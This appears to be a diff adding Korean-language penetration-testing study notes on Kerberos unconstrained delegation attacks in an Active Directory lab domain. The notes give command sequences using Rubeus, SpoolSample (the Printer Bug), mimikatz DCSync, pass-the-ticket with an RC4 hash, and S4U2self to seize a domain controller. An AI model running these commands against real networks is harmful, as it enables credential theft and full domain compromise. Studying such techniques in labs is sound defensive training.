@@ -6,6 +6,59 @@
 ### Unconstrained Delegation
 - 유저가 서비스에 인증하면 그 유저의 TGT 복사본이 서비스에 저장되고, 서비스는 이 TGT로 어떤 서비스든 ST를 요청해 유저 행세를 할 수 있다.
 
+#### Waiting for Privileged User Authentication
+- 서비스 서버를 장악한 뒤, Domain Admin 같은 특권 계정이 로그인해오길 기다렸다가, 그때 LSASS에 저장되는 TGT를 Rubeus로 탈취하는 공격.
+```powershell
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainGroup -MemberIdentity sarah.lafferty
+```
+```powershell
+.\Rubeus.exe asktgs /ticket:<base64 ticket> /service:cifs/dc01.INLANEFREIGHT.local /ptt
+
+.\Rubeus.exe renew /ticket:<base64 ticket> /ptt
+```
+```powershell
+dir \\dc01.inlanefreight.local\c$
+```
+
+#### Leveraging the Printer Bug
+- 원래 스풀러 서비스는 "프린터 상태 알림"을 위한 기능인데 인증 없이 (또는 매우 낮은 권한으로) 누구든 "어디로 콜백을 보내라"고 지정할 수 있다는 게 설계 결함.
+- DC의 스풀러 서비스(MS-RPRN)에 "프린터 변경 알림을 내 서버로 보내라"고 RPC 요청을 보내, DC$ 계정이 공격자가 장악한 Unconstrained Delegation 서버로 강제 인증하게 만들어, DC$의 TGT를 즉시(기다림 없이) 탈취하는 기법.
+
+```powershell
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+```powershell
+.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+```
+```powershell
+.\Rubeus.exe renew /ticket:<base64 ticket> /ptt
+```
+```powershell
+.\mimikatz.exe
+
+lsadump::dcsync /user:sarah.lafferty
+```
+```powershell
+.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
+```
+```powershell
+dir \\dc01.inlanefreight.local\c$
+```
+
+#### S4U2self for Non-Domain Controllers
+- DC$의 TGT를 이용해 S4U2Self → S4U2Proxy를 거쳐, "Administrator 자격의 CIFS/dc01 서비스용 ST"를 발급받고, 이 ST로 DC01의 SMB(파일 공유)에 Administrator 권한으로 접근하여 시스템을 장악.
+```powershell
+.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:<base64 ticket>
+```
+```powershell
+ls \\dc01.inlanefreight.local\c$
+```
+
 ### Constrained Delegation
 - 서비스(A)가 KDC에 User가 서비스(A)에 접근할 때 썼던 티켓을 그대로 `additional tickets`로 첨부 제출하면서, "이 티켓 속 유저(cname) 자격으로 서비스(B)용 새 ST를 발급해달라"고 요청하는 것(S4U2Proxy)
 - `cname-in-addl-tkt` 플래그를 통해 KDC는 서비스가 아니라 첨부 티켓 속 cname(User) 기준으로 발급 대상을 판단
